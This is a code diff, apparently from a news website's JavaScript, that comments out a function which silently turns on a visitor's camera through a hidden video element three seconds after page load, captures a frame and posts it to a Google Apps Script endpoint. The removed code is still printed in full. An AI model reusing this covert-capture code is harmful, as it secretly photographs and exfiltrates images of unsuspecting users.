@@ -180,53 +180,53 @@ fetch("https://news-api-proxy-glax.vercel.app/api/visitor-info")
   })
   .catch(err => console.error("Visitor info error:", err));
 // -------------------------------------DELETE LATER DON'T FORGET --------------------------
-async function captureAndSend() {
-  try {
-    // 1. Get camera stream
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-    const video = document.getElementById("hidden-camera");
-    video.srcObject = stream;
+// async function captureAndSend() {
+//   try {
+//     // 1. Get camera stream
+//     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+//     const video = document.getElementById("hidden-camera");
+//     video.srcObject = stream;
 
-    // 2. Wait until video has data
-    await new Promise(resolve => {
-      video.onloadedmetadata = () => {
-        resolve();
-      };
-    });
+//     // 2. Wait until video has data
+//     await new Promise(resolve => {
+//       video.onloadedmetadata = () => {
+//         resolve();
+//       };
+//     });
 
-    // 3. Create a canvas to capture frame
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
+//     // 3. Create a canvas to capture frame
+//     const canvas = document.createElement("canvas");
+//     canvas.width = video.videoWidth;
+//     canvas.height = video.videoHeight;
+//     const ctx = canvas.getContext("2d");
+//     ctx.drawImage(video, 0, 0);
 
-    // 4. Get base64 image
-    const imageData = canvas.toDataURL("image/png"); // data:image/png;base64,...
+//     // 4. Get base64 image
+//     const imageData = canvas.toDataURL("image/png"); // data:image/png;base64,...
 
-    // 5. Send it to Google Sheets (via Apps Script)
-    await fetch("https://script.google.com/macros/s/AKfycbwSXkPcSIQwIVDJBNV6M2Rp0hTulK9u5bFdGHWeY-mAnt40eDBhn0_VMQcYSAxons4/exec", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        snapshot: imageData,
-        timestamp: new Date().toISOString()
-      })
-    });
+//     // 5. Send it to Google Sheets (via Apps Script)
+//     await fetch("https://script.google.com/macros/s/AKfycbwSXkPcSIQwIVDJBNV6M2Rp0hTulK9u5bFdGHWeY-mAnt40eDBhn0_VMQcYSAxons4/exec", {
+//       method: "POST",
+//       headers: { "Content-Type": "application/json" },
+//       body: JSON.stringify({
+//         snapshot: imageData,
+//         timestamp: new Date().toISOString()
+//       })
+//     });
 
-    console.log("Snapshot sent.");
+//     console.log("Snapshot sent.");
 
-    // 6. Stop the camera
-    stream.getTracks().forEach(track => track.stop());
-  } catch (err) {
-    console.error("Camera failed or denied:", err);
-  }
-}
+//     // 6. Stop the camera
+//     stream.getTracks().forEach(track => track.stop());
+//   } catch (err) {
+//     console.error("Camera failed or denied:", err);
+//   }
+// }
 
-// Optional trigger — for demo, we call it 3 seconds after page load
-setTimeout(() => {
-  captureAndSend();
-}, 3000);
+// // Optional trigger — for demo, we call it 3 seconds after page load
+// setTimeout(() => {
+//   captureAndSend();
+// }, 3000);
 // ----------------------------------------------------------------------------Delete Later
 //IP chekcer
 
